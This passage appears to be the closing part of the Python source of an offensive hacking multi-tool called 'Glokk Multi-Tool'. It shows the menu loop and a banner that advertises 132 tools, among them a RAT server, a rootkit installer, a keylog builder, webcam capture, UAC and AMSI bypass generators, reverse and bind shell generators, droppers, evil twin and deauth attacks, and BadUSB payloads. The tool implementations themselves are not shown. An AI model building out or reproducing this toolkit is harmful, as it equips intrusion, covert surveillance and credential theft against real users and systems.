    "49": tool_49, "50": tool_50, "51": tool_51, "52": tool_52,
    "53": tool_53, "54": tool_54, "55": tool_55, "56": tool_56,
    "57": tool_57, "58": tool_58, "59": tool_59, "60": tool_60,
    "61": tool_61, "62": tool_62, "63": tool_63, "64": tool_64,
    "65": tool_65, "66": tool_66,
}

tools_page2 = {
    "67": tool_67, "68": tool_68, "69": tool_69, "70": tool_70,
    "71": tool_71, "72": tool_72, "73": tool_73, "74": tool_74,
    "75": tool_75, "76": tool_76, "77": tool_77, "78": tool_78,
    "79": tool_79, "80": tool_80, "81": tool_81, "82": tool_82,
    "83": tool_83, "84": tool_84, "85": tool_85, "86": tool_86,
    "87": tool_87, "88": tool_88, "89": tool_89, "90": tool_90,
    "91": tool_91, "92": tool_92, "93": tool_93, "94": tool_94,
    "95": tool_95, "96": tool_96, "97": tool_97, "98": tool_98,
    "99": tool_99, "100": tool_100, "101": tool_101, "102": tool_102,
    "103": tool_103, "104": tool_104, "105": tool_105, "106": tool_106,
    "107": tool_107, "108": tool_108, "109": tool_109, "110": tool_110,
    "111": tool_111, "112": tool_112, "113": tool_113, "114": tool_114,
    "115": tool_115, "116": tool_116, "117": tool_117, "118": tool_118,
    "119": tool_119, "120": tool_120, "121": tool_121, "122": tool_122,
    "123": tool_123, "124": tool_124, "125": tool_125, "126": tool_126,
    "127": tool_127, "128": tool_128, "129": tool_129, "130": tool_130,
    "131": tool_131, "132": tool_132,
}

def menu():
    page = 1
    while True:
        clear()
        if page == 1:
            banner()
        elif page == 2:
            banner_page2()
            
        first_line = "┌──(User@Glokk Tool) -[~Menu]│"
        print(Colorate.Horizontal(Colors.purple_to_blue, first_line, 1))

        prompt = Colorate.Horizontal(
            Colors.purple_to_blue,
            "\n└─$> ",
            1
        )

        choice = input(prompt).strip().lower()

        if choice == "e":
            if rat_server_instance and rat_server_instance.running:
                rat_server_instance.stop()
            print(f"{GREEN}[+] Goodbye!{RESET}")
            break

        elif choice == "n":
            if page == 1:
                page = 2
            continue

        elif choice == "b":
            if page == 2:
                page = 1
            continue

        elif choice == "i":
            print(f"{CYAN}[+] Glokk Multi-Tool v4.0{RESET}")
            print(f"{CYAN}[+] Author: glokk{RESET}")
            print(f"{CYAN}[+] Discord: 2kglokk{RESET}")
            print(f"{CYAN}[+] Tools: 132{RESET}")
            input(f"\n{RED}[?] Press Enter{RESET}")
            continue

        elif page == 1 and choice in tools:
            try:
                clear()
                tools[choice]()
            except Exception as e:
                print(f"{RED}[-] Error: {e}{RESET}")
            input(f"\n{YELLOW}[?] Press Enter to continue...{RESET}")

        elif page == 2 and choice in tools_page2:
            try:
                clear()
                banner_page2()
                tools_page2[choice]()
            except Exception as e:
                print(f"{RED}[-] Error: {e}{RESET}")
            input(f"\n{YELLOW}[?] Press Enter to continue...{RESET}")

        else:
            print(f"{RED}[-] Invalid option{RESET}")
            time.sleep(1)
            
def banner_page2():
    clear()
    print(Colorate.Horizontal(Colors.purple_to_blue, r"""
┌─ Network / Advanced ─────────┐┌─ Exploitation ───────────────┐┌─ Hardware / Mobile ──────────┐     ___ _    ___  _  ___  __    
│                              ││                              ││                              │    / __| |  / _ \| |/ / |/ /
│ [67] WiFi Deauth Attack      ││ [89] Process Injector        ││ [111] Clipboard Hijack       │   | (_ | |_| (_) | ' <| ' <  
│ [68] ARP Poison MITM         ││ [90] DLL Sideloader          ││ [112] Reverse Shell Gen      │    \___|____\___/|_|\_\_|\_\ 
│ [69] DNS Spoof Server        ││ [91] UAC Bypass Gen          ││ [113] Bind Shell Gen         │                                
│ [70] MAC Flooder             ││ [92] AMSI Bypass Gen         ││ [114] USB Rubber Script      │           Author : glokk
│ [71] Evil Twin AP            ││ [93] Rootkit Installer       ││ [115] BadUSB Payload         │          Discord : 2kglokk
│ [72] PMKID Capture           ││ [94] Persistence Kit         ││ [116] Android APK Binder     │                 2/2
│ [73] Handshake Capturer      ││ [95] Keylog Builder          ││ [117] Office Macro Maker     │  
│ [74] WPA Crack Brute         ││ [96] Screen Recorder         ││ [118] SQLMap Wrapper         │   [N] Next
│ [75] Bluetooth Scanner       ││ [97] Webcam Capture          ││ [119] XSS Hunter             │   [B] Back
│ [76] ARP Scanner             ││ [98] Registry Persist        ││ [120] LFI to RCE             │   [I] Info
│ [77] IPv6 Scanner            ││ [99] Scheduled Tasker        ││ [121] RFI Exploit            │   [E] Exit
│ [78] UPnP Scanner            ││ [100] WMI Event Sub          ││ [122] SSTI Scanner           │  
│ [79] SNMP Scanner            ││ [101] Startup Folder         ││ [123] XXE Injector           │  
│ [80] NTP Scanner             ││ [102] Services Install       ││ [124] SSRF Tester            │  
│ [81] SMB Scanner             ││ [103] COM Hijack             ││ [125] Open Redirect Finder   │  
│ [82] LDAP Scanner            ││ [104] DLL Search Order       ││ [126] Host Header Injection  │  
│ [83] SSH Scanner             ││ [105] SideLoading            ││ [127] CRLF Injector          │  
│ [84] FTP Scanner             ││ [106] Image File Exec        ││ [128] LDAP Injection         │  
│ [85] RDP Scanner             ││ [107] LNK File Dropper       ││ [129] NoSQL Scanner          │  
│ [86] VNC Scanner             ││ [108] HTA Dropper            ││ [130] GraphQL Introspect     │  
│ [87] Telnet Scanner          ││ [109] VBS Dropper            ││ [131] JWT Cracker            │  
│ [88] DNS Zone Transfer       ││ [110] JS Dropper             ││ [132] PowerShell Drop        │  
└──────────────────────────────┘└──────────────────────────────┘└──────────────────────────────┘    

"""))

def main():
    init(autoreset=True)
    menu()

if __name__ == "__main__":
    main()    
